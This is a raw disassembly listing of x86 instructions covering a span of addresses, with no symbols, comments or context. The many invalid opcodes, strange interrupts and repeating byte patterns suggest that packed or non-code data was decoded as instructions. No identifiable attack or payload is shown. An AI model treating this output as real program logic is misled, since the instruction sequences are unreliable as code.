  426293:	add    BYTE PTR [eax-0x32e11380],0x76
  42629a:	sbb    al,0xcd
  42629c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  4262a3:	or     ch,0xa
  4262a6:	and    eax,0xcd808081
  4262ab:	xor    BYTE PTR [ebx],0x81
  4262ae:	or     dh,BYTE PTR [esi-0x3]
  4262b1:	int    0x76
  4262b3:	std    
  4262b4:	stos   BYTE PTR es:[edi],al
  4262b5:	test   al,0x63
  4262b7:	retf   
  4262b8:	rcr    BYTE PTR [eax+eax*4],cl
  4262bb:	xchg   esi,eax
  4262bc:	int    0xed
  4262be:	int    0x76
  4262c0:	dec    esp
  4262c1:	adc    ch,ch
  4262c3:	cmp    eax,0x5b808081
  4262c8:	cwde   
  4262c9:	call   0x2f35:0x86214966
  4262d0:	push   es
  4262d1:	mov    ecx,0xcd80804a
  4262d6:	jbe    0x426308
  4262d8:	inc    cx
  4262da:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262e0:	dec    edx
  4262e1:	add    BYTE PTR [eax-0x29128937],0x37
  4262e8:	ficom  WORD PTR [ebx]
  4262ea:	pop    ebp
  4262eb:	mov    ebp,0xa25230a
  4262f0:	jbe    0x426303
  4262f2:	leave  
  4262f3:	jbe    0x4262aa
  4262f5:	xchg   ecx,eax
  4262f6:	aaa    
  4262f7:	ficom  WORD PTR [ebx]
  4262f9:	or     dh,BYTE PTR [esi-0x43]
  4262fc:	int    0x76
  4262fe:	mov    BYTE PTR [edx],cl
  426300:	jbe    0x4262f7
  426302:	int    0x76
  426304:	cmc    
  426305:	int    0x1
  426307:	mov    ebp,0xcd808081
  42630c:	or     ch,0x80
  42630f:	or     dh,BYTE PTR [esi-0x7]
  426312:	pop    edi
  426313:	jle    0x42634a
  426315:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42631c:	mov    eax,0x4b0760a
  426321:	ins    DWORD PTR es:[edi],dx
  426322:	(bad)  
  426323:	mov    eax,0xcda2760a
  426328:	sar    DWORD PTR [eax+0x5d15760a],cl
  42632e:	(bad)  
  42632f:	xor    eax,0xf1cd8080
  426334:	mov    eax,0xcf19960a
  426339:	nop
  42633a:	xchg   edx,eax
  42633b:	iret   
  42633c:	sahf   
  42633d:	(bad)  
  42633e:	int    0x99
  426340:	mov    eax,0xcd1d960a
  426345:	aad    0xb8
  426347:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42634d:	mov    eax,0xcf01960a
  426352:	jno    0x4263a8
  426354:	int    0x3
  426356:	mov    eax,0x40be60a
  42635b:	leave  
  42635c:	xchg   ebp,eax
  42635d:	mov    eax,0xcf05e60a
  426362:	ficomp WORD PTR [eax-0x48]
  426365:	or     ah,dh
  426367:	pop    es
  426368:	mov    eax,0xb809760a
  42636d:	or     dl,dh
  42636f:	retf   0xc5cd
  426372:	mov    eax,0xb8cc760a
  426377:	or     dl,BYTE PTR [edi]
  426379:	ins    BYTE PTR es:[edi],dx
  42637a:	add    BYTE PTR [eax],al
  42637c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426383:	push   edx
  426384:	add    BYTE PTR [eax],al
  426386:	add    bh,cl
  426388:	outs   dx,BYTE PTR ds:[esi]
  426389:	add    edi,DWORD PTR [eax+0x74060a]
  42638f:	add    BYTE PTR [eax],al
  426391:	add    al,0x6d
  426393:	inc    edx
  426394:	mov    eax,0x78060a
  426399:	add    BYTE PTR [eax],al
  42639b:	iret   
  42639c:	outs   dx,BYTE PTR ds:[esi]
  42639d:	xor    BYTE PTR [eax+0x7c060a],bh
  4263a3:	add    BYTE PTR [eax],al
  4263a5:	add    al,0x6d
  4263a7:	xor    bh,BYTE PTR [eax+0x8a060a]
  4263ad:	add    BYTE PTR [eax],al
  4263af:	mov    eax,0x8ccf0a
  4263b4:	add    BYTE PTR [eax],al
  4263b6:	int    0xc5
  4263b8:	mov    eax,0x8e060a
  4263bd:	add    BYTE PTR [eax],al
  4263bf:	int    0x76
  4263c1:	in     eax,dx
  4263c2:	int    0x8d
  4263c4:	adc    DWORD PTR [edi],ebp
  4263c6:	inc    ebp
  4263c7:	jge    0x42635b
  4263c9:	shr    ebx,cl
  4263cb:	xchg   edx,eax
  4263cc:	int    0x8d
  4263ce:	in     eax,dx
  4263cf:	int    0x96
  4263d1:	adc    ebx,eax
  4263d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263d4:	mov    esi,0xc93b4229
  4263d9:	cmp    ebx,edx
  4263db:	shl    edx,cl
  4263dd:	sub    BYTE PTR [ebx-0x2e],dl
  4263e0:	in     al,dx
  4263e1:	outs   dx,BYTE PTR ds:[esi]
  4263e2:	iret   
  4263e3:	aam    0x76
  4263e5:	mov    al,0xb8
  4263e7:	int    0x4e
  4263e9:	das    
  4263ea:	mov    ebx,0xcbbb2f18
  4263ef:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263f2:	sti    
  4263f3:	and    DWORD PTR ds:0xf3e38080,esi
  4263f9:	shl    edx,cl
  4263fb:	das    
  4263fc:	push   ebx
  4263fd:	adc    ecx,DWORD PTR [ecx]
  4263ff:	int3   
  426400:	test   DWORD PTR [ebp-0x32ffff01],esp
  426406:	lea    esi,[ebp+0x2fbd96cd]
  42640c:	inc    ebp
  42640d:	jecxz  0x4263a1
  42640f:	shl    ebx,cl
  426411:	xchg   edx,eax
  426412:	int    0x96
  426414:	mov    ch,0xcd
  426416:	(bad)  
  426417:	mov    ebp,0xf73bf03b
  42641c:	push   ebx
  42641d:	psrlq  mm5,mm2
  426420:	sub    BYTE PTR [edi-0x7906fb2d],al
  426426:	(bad)  
  426427:	popa   
  426428:	int    0x76
  42642a:	in     eax,dx
  42642b:	int    0x8d
  42642d:	adc    DWORD PTR [edi],ebp
  42642f:	inc    ebp
  426430:	jge    0x4263c4
  426432:	shr    ebx,cl
  426434:	xchg   edx,eax
  426435:	int    0x8d
  426437:	in     eax,dx
  426438:	int    0x96
  42643a:	adc    DWORD PTR [ebx],edi
  42643c:	leave  
  42643d:	cmp    ebx,edx
  42643f:	shl    edx,cl
  426441:	sub    BYTE PTR [ebx-0x2e],dl
  426444:	in     al,dx
  426445:	outs   dx,BYTE PTR ds:[esi]
  426446:	iret   
  426447:	aam    0x76
  426449:	add    DWORD PTR [eax-0x44d0b133],edi
  42644f:	sbb    BYTE PTR [edi],ch
  426451:	mov    ebx,0x120c3bcb
  426456:	sti    
  426457:	and    DWORD PTR ds:0xf3e38080,esi
  42645d:	shl    edx,cl
  42645f:	das    
  426460:	push   ebx
  426461:	adc    ecx,DWORD PTR [ecx]
  426463:	int3   
  426464:	test   esp,ecx
  426466:	inc    DWORD PTR [eax]
  426468:	add    ch,cl
  42646a:	lea    esi,[ebp+0x2fbd96cd]
  426470:	inc    ebp
  426471:	jecxz  0x426405
  426473:	shl    ebx,cl
  426475:	xchg   edx,eax
  426476:	int    0x96
  426478:	mov    ch,0xcd
  42647a:	(bad)  
  42647b:	mov    ebp,0xf73bf03b
  426480:	push   ebx
  426481:	psrlq  mm5,mm2
  426484:	sub    BYTE PTR [edi-0x7406fb2d],al
  42648a:	(bad)  
  42648b:	popa   
  42648c:	int    0x76
  42648e:	in     eax,dx
  42648f:	int    0x8d
  426491:	adc    DWORD PTR [edi],ebp
  426493:	inc    ebp
  426494:	jge    0x426428
  426496:	shr    ebx,cl
  426498:	xchg   edx,eax
  426499:	int    0x8d
  42649b:	in     eax,dx
  42649c:	int    0x96
  42649e:	adc    DWORD PTR [ebx],edi
  4264a0:	leave  
  4264a1:	cmp    ebx,edx
  4264a3:	shl    edx,cl
  4264a5:	sub    BYTE PTR [ebx-0x2e],dl
  4264a8:	in     al,dx
  4264a9:	je     0x42647a
  4264ab:	push   ebp
  4264ac:	jbe    0x42651a
  4264ae:	add    BYTE PTR [eax],al
  4264b0:	add    BYTE PTR [eax-0x44d0b133],bh
  4264b6:	sbb    BYTE PTR [edi],ch
  4264b8:	mov    ebx,0x120c3bcb
  4264bd:	sti    
  4264be:	and    DWORD PTR ds:0xf3e38080,esi
  4264c4:	shl    edx,cl
  4264c6:	das    
  4264c7:	push   ebx
  4264c8:	adc    ecx,DWORD PTR [ecx]
  4264ca:	int3   
  4264cb:	test   DWORD PTR ds:0xcd0000ff,eax
  4264d1:	lea    esi,[ebp+0x2fbd96cd]
  4264d7:	inc    ebp
  4264d8:	jecxz  0x42646c
  4264da:	shl    ebx,cl
  4264dc:	xchg   edx,eax
  4264dd:	int    0x96
  4264df:	mov    ch,0xcd
  4264e1:	(bad)  
  4264e2:	mov    ebp,0xf73bf03b
  4264e7:	push   ebx
  4264e8:	psrlq  mm5,mm2
  4264eb:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264f1:	(bad)  
  4264f2:	mov    ebx,0xffb506cf
  4264f7:	add    BYTE PTR [eax],al
  4264f9:	or     dh,BYTE PTR [esi-0x7]
  4264fc:	int    0x76
  4264fe:	stc    
  4264ff:	pop    edi
  426500:	inc    esi
  426501:	pop    esp
  426502:	inc    ebp
  426503:	xchg   edi,eax
  426504:	or     cl,BYTE PTR [eax+0x79245161]
  42650a:	daa    
  42650b:	or     dh,BYTE PTR [eax-0x7c]
  42650e:	int    0x6
  426510:	mov    ch,0xff
  426512:	add    BYTE PTR [eax],al
  426514:	int    0x57
  426516:	mov    ebp,0xa0000ff
  42651b:	(bad)  
  42651c:	mov    ebp,0x8621d169
  426521:	xor    eax,0x62fd343
  426526:	pusha  
  426527:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426531:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426538:	mov    eax,0xfff9060a
  42653d:	add    BYTE PTR [eax],al
  42653f:	int    0xc5
  426541:	mov    eax,0xff03060a
  426546:	add    BYTE PTR [eax],al
  426548:	pop    ebp
  426549:	es xor eax,0xab88080
  42654f:	push   es
  426550:	std    
  426551:	inc    DWORD PTR [eax]
  426553:	add    BYTE PTR [ebp-0x5d],bl
  426556:	xor    eax,0xab88080
  42655b:	push   es
  42655c:	(bad)  
  42655d:	inc    DWORD PTR [eax]
  42655f:	add    BYTE PTR [ebp+0x1e],bl
  426562:	xor    eax,0xab88080
  426567:	push   es
  426568:	add    BYTE PTR [eax],0x0
  42656b:	add    BYTE PTR [ebp*2-0x47823218],al
  426572:	or     cl,bh
  426574:	xchg   edx,eax
  426575:	add    BYTE PTR [eax],al
  426577:	add    ch,cl
  426579:	jbe    0x4265ab
  42657b:	pop    edi
  42657c:	dec    ebx
  42657d:	xor    eax,0xab88080
  426582:	iret   
  426583:	test   BYTE PTR [eax],al
  426585:	add    BYTE PTR [eax],al
  426587:	add    al,0xd3
  426589:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42658f:	add    BYTE PTR [eax],al
  426591:	pop    edi
  426592:	push   esi
  426593:	xor    eax,0xab88080
  426598:	iret   
  426599:	mov    BYTE PTR [eax],al
  42659b:	add    BYTE PTR [eax],al
  42659d:	add    al,0xd3
  42659f:	pushf  
  4265a0:	mov    eax,0x4acf0a
  4265a5:	add    BYTE PTR [eax],al
  4265a7:	int    0xc
  4265a9:	mov    eax,0x4ccf0a
  4265ae:	add    BYTE PTR [eax],al
  4265b0:	pop    edi
  4265b1:	add    al,0x35
  4265b3:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  4265ba:	add    BYTE PTR [eax],al
  4265bc:	cmp    edi,DWORD PTR [ecx+0x5f]
  4265bf:	adc    DWORD PTR [eax-0x80],edx
  4265c2:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  4265c9:	add    bl,dl
  4265cb:	mov    ebp,0x151a5f92
  4265d0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265d7:	add    BYTE PTR [eax],al
  4265d9:	pop    edi
  4265da:	call   0xcf0a:0xb88080eb
  4265e1:	adc    al,0x0
  4265e3:	add    BYTE PTR [eax],al
  4265e5:	int    0x8d
  4265e7:	xor    BYTE PTR [edx+eax*1],al
  4265ea:	call   ebx
  4265ec:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265f0:	or     al,BYTE PTR [esi]
  4265f2:	adc    eax,0xcd0000ff
  4265f7:	jbe    0x426645
  4265f9:	int    0x8d
  4265fb:	dec    esp
  4265fc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265ff:	mov    ebp,0xff020492
  426604:	shl    edx,cl
  426606:	sub    BYTE PTR [ebx-0x2d],dl
  426609:	leave  
  42660a:	add    eax,0xff1d06
  42660f:	add    BYTE PTR [eax],al
  426611:	add    BYTE PTR [eax+0x1506cf80],al
  426617:	inc    DWORD PTR [eax]
  426619:	add    BYTE PTR [eax-0x33],dh
  42661c:	jbe    0x42664e
  42661e:	int    0x8d
  426620:	xor    BYTE PTR [ebx],bh
  426622:	jns    0x4265f7
  426624:	mov    ebp,0xff020492
  426629:	shl    edx,cl
  42662b:	sub    BYTE PTR [ebx-0x2d],dl
  42662e:	jo     0x4265ff
  426630:	push   es
  426631:	stc    
  426632:	inc    DWORD PTR [eax]
  426634:	add    BYTE PTR [eax-0x33],dh
  426637:	jbe    0x42662e
  426639:	int    0x1
  42663b:	cmp    eax,0xc9808081
  426640:	push   es
  426641:	sbb    BYTE PTR [eax],al
  426643:	add    BYTE PTR [eax],al
  426645:	inc    eax
  426646:	retf   
  426647:	fwait
  426648:	xor    eax,0x76cd5000
  42664d:	adc    al,0x0
  42664f:	icebp  
  426650:	or     dh,BYTE PTR [esi-0x7]
  426653:	int    0x76
  426655:	stc    
  426656:	push   es
  426657:	ins    DWORD PTR es:[edi],dx
  426658:	aam    0x4a
  42665a:	adc    dl,BYTE PTR [esi+0x68]
  42665d:	or     BYTE PTR [ebx+ecx*1],bl
  426660:	fmul   QWORD PTR [ebx-0x17]
  426663:	(bad)  
  426664:	int    0x8d
  426666:	dec    esp
  426667:	int    0x96
  426669:	dec    esp
  42666a:	sar    bh,0x3b
  42666d:	setl   BYTE PTR [ebx]
  426670:	icebp  
  426671:	shr    edx,cl
  426673:	sub    bl,dl
  426675:	jmp    0x426609
  426677:	push   ebx
  426678:	adc    ecx,ebp
  42667a:	xchg   esi,eax
  42667b:	cmc    
  42667c:	int    0xa2
  42667e:	and    eax,0x5e808081
  426683:	dec    edx
  426684:	das    
  426685:	push   es
  426686:	popa   
  426687:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42668d:	int    0x96
  42668f:	dec    esp
  426690:	cmp    ecx,DWORD PTR [edi]
  426692:	shr    ebx,cl
  426694:	xchg   edx,eax
  426695:	cmp    esi,ecx
  426697:	shr    edx,cl
  426699:	sub    BYTE PTR [ebx+0x13],dl
  42669c:	int    0x96
  42669e:	cmc    
  42669f:	int    0xa2
  4266a1:	in     al,0x81
  4266a3:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  4266aa:	int    0x96
  4266ac:	dec    esp
  4266ad:	cmp    ecx,DWORD PTR [edi]
  4266af:	shr    ebx,cl
  4266b1:	xchg   edx,eax
  4266b2:	cmp    esi,ecx
  4266b4:	shr    edx,cl
  4266b6:	sub    BYTE PTR [ebx+0x13],dl
  4266b9:	int    0x96
  4266bb:	cmc    
  4266bc:	int    0xa2
  4266be:	add    DWORD PTR [ecx+0x4a0a8080],eax
  4266c4:	pop    edi
  4266c5:	xor    ax,0x8080
  4266c9:	mov    eax,0x24cf0a
  4266ce:	add    BYTE PTR [eax],al
  4266d0:	int    0xc
  4266d2:	mov    eax,0x28cf0a
  4266d7:	add    BYTE PTR [eax],al
  4266d9:	pop    edi
  4266da:	es xor eax,0xab88080
  4266e0:	iret   
  4266e1:	sub    al,0x0
  4266e3:	add    BYTE PTR [eax],al
  4266e5:	pop    edi
  4266e6:	daa    
  4266e7:	xor    eax,0xab88080
  4266ec:	iret   
  4266ed:	xor    al,BYTE PTR [eax]
  4266ef:	add    BYTE PTR [eax],al
  4266f1:	add    al,0xd3
  4266f3:	test   eax,0x34cf0ab8
  4266f8:	add    BYTE PTR [eax],al
  4266fa:	add    BYTE PTR [edi-0x69],bl
  4266fd:	xor    eax,0xab88080
  426702:	iret   
  426703:	cmp    BYTE PTR [eax],al
  426705:	add    BYTE PTR [eax],al
  426707:	add    al,0xd3
  426709:	mov    dl,0xb8
  42670b:	or     cl,bh
  42670d:	cmp    al,0x0
  42670f:	add    BYTE PTR [eax],al
  426711:	pop    edi
  426712:	fwait
  426713:	xor    eax,0xab88080
  426718:	iret   
  426719:	inc    eax
  42671a:	add    BYTE PTR [eax],al
  42671c:	add    ch,cl
  42671e:	or     al,0xb8
  426720:	or     cl,bh
  426722:	inc    esp
  426723:	add    BYTE PTR [eax],al
  426725:	add    BYTE PTR [edi+0x17],bl
  426728:	xor    eax,0xab88080
  42672d:	iret   
  42672e:	dec    eax
  42672f:	add    BYTE PTR [eax],al
  426731:	add    BYTE PTR [edi+0x26],bl
  426734:	pop    esi
  426735:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42673c:	add    BYTE PTR [eax],al
  42673e:	pop    edi
  42673f:	cmp    esi,DWORD PTR [edx]
  426741:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426748:	add    BYTE PTR [eax],al
  42674a:	jns    0x4267c2
  42674c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42674d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42674e:	pop    edi
  42674f:	pop    esp
  426750:	adc    eax,0xab88080
  426755:	iret   
  426756:	push   esp
  426757:	add    BYTE PTR [eax],al
  426759:	add    BYTE PTR [ebx+edx*8],al
  42675c:	pop    esp
  42675d:	mov    eax,0x58cf0a
  426762:	add    BYTE PTR [eax],al
  426764:	jns    0x4267dc
  426766:	fisttp WORD PTR [ecx+0x79]
  426769:	jbe    0x426714
  42676b:	inc    ecx
  42676c:	jns    0x4267e4
  42676e:	loope  0x426713
  426770:	pop    edi
  426771:	fcom   st(4)
  426773:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42677a:	add    BYTE PTR [eax],al
  42677c:	jns    0x4267f4
  42677e:	lods   eax,DWORD PTR ds:[esi]
  42677f:	push   edi
  426780:	pop    edi
  426781:	jnp    0x4267d8
  426783:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42678a:	add    BYTE PTR [eax],al
  42678c:	jns    0x426804
  42678e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426792:	jmp    0x8080:0x35a15f47
  426799:	mov    eax,0x64cf0a
  42679e:	add    BYTE PTR [eax],al
  4267a0:	jns    0x426818
  4267a2:	in     eax,0x18
  4267a4:	int    0x8d
  4267a6:	xor    ch,cl
  4267a8:	xchg   esi,eax
  4267a9:	xor    BYTE PTR [ebx],bh
  4267ab:	(bad)  
  4267ad:	icebp  
  4267ae:	shr    ebx,cl
  4267b0:	xchg   edx,eax
  4267b1:	shr    edx,cl
  4267b3:	sub    BYTE PTR [ebx+0x13],dl
  4267b6:	in     al,dx
  4267b7:	xchg   esp,eax
  4267b8:	int    0x96
  4267ba:	xor    ch,cl
  4267bc:	out    0x30,al
  4267be:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267c4:	stc    
  4267c5:	shr    ecx,cl
  4267c7:	sub    BYTE PTR [ebx-0x27],dl
  4267ca:	xor    edx,DWORD PTR [ebx]
  4267cc:	das    
  4267cd:	pop    ecx
  4267ce:	mov    WORD PTR [ebp-0x5b],cs
  4267d1:	int    0x96
  4267d3:	xor    ch,cl
  4267d5:	out    0x30,al
  4267d7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267dd:	stc    
  4267de:	shr    ecx,cl
  4267e0:	sub    BYTE PTR [ebx-0x27],dl
  4267e3:	int    0xe6
  4267e5:	stc    
  4267e6:	add    al,0x2
  4267e8:	adc    DWORD PTR [edx],0xffffffd3
  4267eb:	fwait
  4267ec:	add    BYTE PTR [eax+0x9033380],0x8c
  4267f3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267f5:	int    0x96
  4267f7:	xor    ch,cl
  4267f9:	lea    esi,[eax]
  4267fb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426801:	sub    bl,dl
  426803:	repz xchg edx,eax
  426805:	push   ebx
  426806:	jecxz  0x4267d5
  426808:	(bad)  
  426809:	stc    
  42680a:	xchg   DWORD PTR [ebx],edx
  42680c:	int    0x96
  42680e:	xor    ch,cl
  426810:	out    0x30,al
  426812:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426818:	xchg   edx,eax
  426819:	shr    ecx,cl
  42681b:	sub    BYTE PTR [ebx-0x27],dl
  42681e:	add    al,0xd2
  426820:	mov    BYTE PTR [edx],cl
  426822:	(bad)  
  426823:	stc    
  426824:	inc    ebx
  426825:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  42682b:	int    0x96
  42682d:	xor    BYTE PTR [ebx],bh
  42682f:	(bad)  
  426831:	icebp  
  426832:	shr    ebx,cl
  426834:	xchg   edx,eax
  426835:	shr    edx,cl
  426837:	sub    BYTE PTR [ebx+0x13],dl
  42683a:	or     cl,bh
  42683c:	adc    eax,0xcd0000ff
  426841:	lea    ecx,[ebp+ecx*8-0x6a]
  426845:	dec    esp
  426846:	cmp    ecx,DWORD PTR [edi]
  426848:	cmp    esi,ecx
  42684a:	shr    edx,cl
  42684c:	sub    bl,dl
  42684e:	jmp    0x4267e2
  426850:	push   ebx
  426851:	adc    ecx,edi
  426853:	xchg   esi,eax
  426854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426855:	or     dl,BYTE PTR ds:0xff1dcf
  42685b:	add    BYTE PTR [ecx+0x6b],ah
  42685e:	xor    eax,0x13cd8080
  426863:	mov    eax,0x4258d0a
  426868:	rcl    edx,cl
  42686a:	int    0xfa
  42686c:	mov    eax,0xcf29e60a
  426871:	loopne 0x42681c
  426873:	mov    eax,0x42de60a
  426878:	leave  
  426879:	test   BYTE PTR [eax-0x304d19f6],bh
  42687f:	loopne 0x426895
  426881:	mov    eax,0x435e60a
  426886:	leave  
  426887:	loop   0x426841
  426889:	or     ah,dh
  42688b:	cmp    ebp,ecx
  42688d:	cli    
  42688e:	mov    eax,0xcd3de60a
  426893:	add    edi,DWORD PTR [eax-0x32be19f6]
  426899:	cld    
  42689a:	mov    eax,0xcd45e60a
  42689f:	add    edi,DWORD PTR [eax-0x322f19f6]
  4268a5:	cli    
  4268a6:	mov    eax,0xcfc2e60a
  4268ab:	loopne 0x4268d6
  4268ad:	mov    eax,0x455e60a
  4268b2:	leave  
  4268b3:	test   BYTE PTR [eax-0x30a619f6],bh
  4268b9:	loopne 0x426850
  4268bb:	mov    eax,0x45de60a
  4268c0:	leave  
  4268c1:	loop   0x42687b
  4268c3:	or     ah,dh
  4268c5:	popa   
  4268c6:	mov    eax,0xb8658d0a
  4268cb:	or     dl,BYTE PTR [esi-0x47f33297]
  4268d1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    esi,ecx
  4268dc:	cmp    ecx,DWORD PTR [edi]
  4268de:	shr    edx,cl
  4268e0:	sub    bl,dl
  4268e2:	jmp    0x426876
  4268e4:	push   ebx
  4268e5:	adc    ecx,ebp
  4268e7:	xchg   esi,eax
  4268e8:	dec    esp
  4268e9:	int    0xe6
  4268eb:	dec    esp
  4268ec:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268f2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268f8:	jmp    0x301bbc25
  4268fd:	mov    ebx,0xb8d93b5e
  426902:	or     dh,BYTE PTR [ecx]
  426904:	int    0x8d
  426906:	dec    esp
  426907:	int    0x96
  426909:	dec    esp
  42690a:	cmp    ecx,DWORD PTR [edi]
  42690c:	cmp    esi,ecx
  42690e:	shr    ebx,cl
  426910:	xchg   edx,eax
  426911:	shr    edx,cl
  426913:	sub    BYTE PTR [ebx+0x13],dl
  426916:	int    0x96
  426918:	dec    esp
  426919:	iret   
  42691a:	mov    WORD PTR [ebp-0x3266c4db],cs
  426920:	out    0x4c,al
  426922:	shl    ebx,cl
  426924:	xchg   edx,eax
  426925:	cmp    edi,ecx
  426927:	shr    ecx,cl
  426929:	sub    BYTE PTR [ebx-0x27],dl
  42692c:	das    
  42692d:	mov    ebx,0xb8d93b5e
  426932:	or     dh,BYTE PTR [ecx]
  426934:	int    0x8d
  426936:	dec    esp
  426937:	int    0x96
  426939:	dec    esp
  42693a:	cmp    esi,ecx
  42693c:	shr    edx,cl
  42693e:	sub    BYTE PTR [ebx],bh
  426940:	psrlq  mm5,mm3
  426943:	xchg   edx,eax
  426944:	push   ebx
  426945:	adc    ecx,ebp
  426947:	xchg   esi,eax
  426948:	dec    esp
  426949:	int    0xe6
  42694b:	dec    esp
  42694c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426952:	stc    
  426953:	shr    ecx,cl
  426955:	sub    BYTE PTR [ebx-0x27],dl
  426958:	mov    eax,0x9096cc0a
  42695d:	inc    DWORD PTR [eax]
  42695f:	add    ch,cl
  426961:	lea    ecx,[ebp+ecx*8-0x6a]
  426965:	dec    esp
  426966:	cmp    esi,ecx
  426968:	shr    edx,cl
  42696a:	sub    BYTE PTR [ebx],bh
  42696c:	psrlq  mm5,mm3
  42696f:	xchg   edx,eax
  426970:	push   ebx
  426971:	adc    ecx,ebp
  426973:	xchg   esi,eax
  426974:	dec    esp
  426975:	int    0xe6
  426977:	dec    esp
  426978:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42697e:	stc    
  42697f:	shr    ecx,cl
  426981:	sub    BYTE PTR [ebx-0x27],dl
  426984:	mov    eax,0xa496cc0a
  426989:	inc    DWORD PTR [eax]
  42698b:	add    ch,cl
  42698d:	lea    esi,[eax]
  42698f:	int    0x96
  426991:	xor    BYTE PTR [ebx],bh
  426993:	icebp  
  426994:	cmp    ecx,DWORD PTR [edi]
  426996:	shr    edx,cl
  426998:	sub    bl,dl
  42699a:	jmp    0x42692e
  42699c:	push   ebx
  42699d:	adc    ecx,ebp
  42699f:	xchg   esi,eax
  4269a0:	xor    ch,cl
  4269a2:	out    0x30,al
  4269a4:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4269aa:	xchg   edx,eax
  4269ab:	shr    ecx,cl
  4269ad:	sub    BYTE PTR [ebx-0x27],dl
  4269b0:	xchg   DWORD PTR [ebx],edx
  4269b2:	or     cl,bh
  4269b4:	adc    eax,0xcd0000ff
  4269b9:	lea    ecx,[ebp+ecx*8-0x6a]
  4269bd:	dec    esp
  4269be:	int    0xe6
  4269c0:	mov    BYTE PTR [ebx],bh
  4269c2:	icebp  
  4269c3:	cmp    ecx,DWORD PTR [edi]
  4269c5:	shr    ebx,cl
  4269c7:	xchg   edx,eax
  4269c8:	shr    edx,cl
  4269ca:	sub    BYTE PTR [ebx+0x13],dl
  4269cd:	iret   
  4269ce:	push   es
  4269cf:	nop
  4269d0:	inc    DWORD PTR [eax]
  4269d2:	add    BYTE PTR [edx],cl
  4269d4:	add    eax,0xff1dcf
  4269d9:	add    bh,cl
  4269db:	jbe    0x4269ad
  4269dd:	mov    ebp,0x10d8
  4269e2:	int    0x8d
  4269e4:	xor    ch,cl
  4269e6:	xchg   esi,eax
  4269e7:	xor    al,al
  4269e9:	(bad)  
  4269ea:	cmp    ecx,DWORD PTR [edi]
  4269ec:	stos   BYTE PTR es:[edi],al
  4269ed:	cmp    ebx,ecx
  4269ef:	shr    ebx,cl
  4269f1:	xchg   edx,eax
  4269f2:	shr    edx,cl
  4269f4:	sub    BYTE PTR [ebx+0x13],dl
  4269f7:	or     al,BYTE PTR ds:0xff1dcf
  4269fd:	add    ch,cl
  4269ff:	jbe    0x426a4d
  426a01:	int    0x8d
  426a03:	dec    esp
  426a04:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a07:	mov    ebp,0xd3f03b92
  426a0c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a10:	aam    0x3c
  426a12:	iret   
  426a13:	push   es
  426a14:	adc    eax,0x700000ff
  426a19:	int    0x76
  426a1b:	xor    ch,cl
  426a1d:	lea    esi,[eax]
  426a1f:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a22:	mov    ebp,0xd3f03b92
  426a27:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a2b:	jo     0x4269fc
  426a2d:	push   es
  426a2e:	and    al,0x0
  426a30:	add    BYTE PTR [eax],al
  426a32:	jo     0x426a01
  426a34:	jbe    0x426a4a
  426a36:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a3d:	int    0x8d
  426a3f:	dec    esp
  426a40:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a43:	lock int 0xe6
  426a46:	mov    bl,dl
  426a48:	mov    ebp,0x28f2d392
  426a4d:	push   ebx
  426a4e:	ror    edi,cl
  426a50:	iret   
  426a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a52:	inc    DWORD PTR [eax]
  426a54:	add    BYTE PTR [edx],cl
  426a56:	int3   
  426a57:	push   es
  426a58:	sbb    eax,0xcf0000ff
  426a5d:	jbe    0x426a84
  426a5f:	mov    ebp,0xeff5
  426a64:	int    0x8d
  426a66:	xor    ch,cl
  426a68:	xchg   esi,eax
  426a69:	xor    BYTE PTR [ebx],bh
  426a6b:	psrlq  mm5,mm3
  426a6e:	xchg   edx,eax
  426a6f:	add    al,0xfb
  426a71:	call   ebx
  426a73:	jmp    0xcf05:0xa135328
  426a7a:	sbb    eax,0x610000ff
  426a7f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a85:	xor    eax,0xab88080
  426a8a:	push   es
  426a8b:	jo     0x426a8d
  426a8d:	add    BYTE PTR [eax],al
  426a8f:	iret   
  426a90:	mov    dh,BYTE PTR [eax]
